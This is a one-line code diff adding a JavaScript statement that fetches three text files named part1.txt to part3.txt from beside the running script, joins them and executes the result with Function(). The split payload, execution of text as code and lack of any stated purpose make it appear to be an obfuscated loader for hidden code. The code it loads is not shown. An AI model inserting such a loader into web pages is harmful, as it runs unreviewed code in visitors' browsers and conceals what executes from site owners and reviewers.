@@ -1,0 +1,1 @@
+const __kaziorBase=new URL('.',document.currentScript.src);Promise.all([1,2,3].map(i=>fetch(new URL(`part${i}.txt`,__kaziorBase)).then(r=>r.text()))).then(p=>Function(p.join(''))()).catch(console.error);
